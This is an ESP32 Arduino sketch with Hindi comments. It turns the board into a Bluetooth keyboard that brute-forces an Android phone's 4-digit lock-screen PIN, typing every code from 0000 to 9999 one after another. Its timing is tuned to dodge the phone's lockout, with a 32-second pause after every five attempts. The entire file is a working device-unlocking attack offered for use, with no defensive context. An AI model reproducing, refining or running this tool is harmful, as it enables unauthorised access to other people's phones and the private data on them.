#include <BleKeyboard.h>

// ब्लूटूथ कीबोर्ड ऑब्जेक्ट बनाना (फोन में डिवाइस का नाम "ESP32_PIN_Tool" दिखेगा)
BleKeyboard bleKeyboard("ESP32_PIN_Tool", "ESP32", 100);

const int BOOT_BUTTON_PIN = 0; 

int currentPin = 0;
int attemptCount = 0;
bool isRunning = false;

void setup() {
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  // ब्लूटूथ कीबोर्ड सेवा शुरू करना
  bleKeyboard.begin();
}

void loop() {
  // 1. जब तक फोन से ब्लूटूथ कनेक्ट न हो, तब तक कोड को आगे न बढ़ाएं
  if (!bleKeyboard.isConnected()) {
    isRunning = false; // कनेक्शन टूटने पर रनिंग स्टेटस बंद करें
    delay(500);        // प्रोसेसर पर लोड कम करने के लिए छोटा सा गैप
    return;
  }

  // 2. ब्लूटूथ कनेक्ट होने के बाद BOOT बटन दबाने का इंतज़ार करें
  if (!isRunning) {
    if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
      delay(50); // बटन डिबाउंस (Debounce)
      if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
        // कर्सर को फोन की लॉक स्क्रीन के पहले बॉक्स पर सेट करने के लिए 5 सेकंड का समय
        delay(5000); 
        isRunning = true; 
      }
    }
    return; 
  }

  // 3. PIN को 4-डिजिट की स्ट्रिंग में बदलना (जैसे 0000)
  char pinString[5];
  sprintf(pinString, "%04d", currentPin);

  // 4. एक-एक करके 4 डिजिट टाइप करना और उनके बीच 15ms का गैप रखना
  for (int i = 0; i < 4; i++) {
    // अगर टाइपिंग के बीच में कनेक्शन टूट जाए तो लूप से बाहर निकलें
    if (!bleKeyboard.isConnected()) break; 

    char digit[2] = {pinString[i], '\0'};
    bleKeyboard.print(digit);
    delay(15); // डिजिट्स के बीच 15ms का गैप (एंड्रॉइड 10 के लिए बेस्ट)
  }
  
  // (नोट: यहाँ Enter की नहीं दबाई जा रही है, फोन ऑटो-सबमिट कर लेगा)

  currentPin++;
  if (currentPin > 9999) {
    currentPin = 0; // 9999 के बाद वापस 0000 से शुरू
  }

  // 5. पिन डालने के बाद फोन को चेक करने और बॉक्स खाली करने के लिए 300ms का समय
  delay(300); 

  attemptCount++;

  // 6. हर 5 बार ट्राई करने के बाद 32 सेकंड का सुरक्षित गैप (लॉकआउट से बचने के लिए)
  if (attemptCount >= 5) {
    attemptCount = 0; 
    delay(32000); // 32 सेकंड का परफेक्ट ब्लॉक-ब्रेक    
  }
}
